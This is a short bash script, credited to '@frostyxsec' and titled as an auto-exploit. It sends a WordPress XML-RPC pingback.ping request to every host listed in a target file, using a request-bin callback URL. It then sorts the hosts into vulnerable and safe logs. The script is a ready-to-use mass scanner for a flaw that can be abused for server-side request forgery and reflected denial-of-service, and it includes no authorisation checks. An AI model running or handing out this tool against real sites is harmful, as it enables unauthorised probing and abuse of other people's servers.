#!/bin/bash

TARGET_FILE="target.txt"
LOG_FILE_VULN="result_vuln.log"
LOG_FILE_SAFE="result_safe.log"

> "result_vuln.log"
> "result_safe.log"

PINGBACK_PAYLOAD='<?xml version="1.0"?>
<methodCall>
   <methodName>pingback.ping</methodName>
   <params>
      <param>
         <value><string>https://www.postb.in/1743497693327-6011258717626?hello=world</string></value>
      </param>
      <param>
         <value><string>https://google.com</string></value>
      </param>
   </params>
</methodCall>'


while IFS= read -r target; do
    echo """
    Auto Exploit Pingback XMLRPC.php by @frostyxsec
    🔍 Testing $target...
    
    """

    
    response=$(curl -s -X POST -d "$PINGBACK_PAYLOAD" -H "Content-Type: text/xml" "$target")

    
    if [[ "$response" == *"<int>0</int>"* ]]; then
        echo "[⚠️ VULNERABLE] $target" | tee -a "$LOG_FILE_VULN"
    	echo ""
     else
        echo "[✅ SAFE] $target" | tee -a "$LOG_FILE_SAFE"
   	echo ""
      fi
done < "$TARGET_FILE"

echo "✅ Done!"
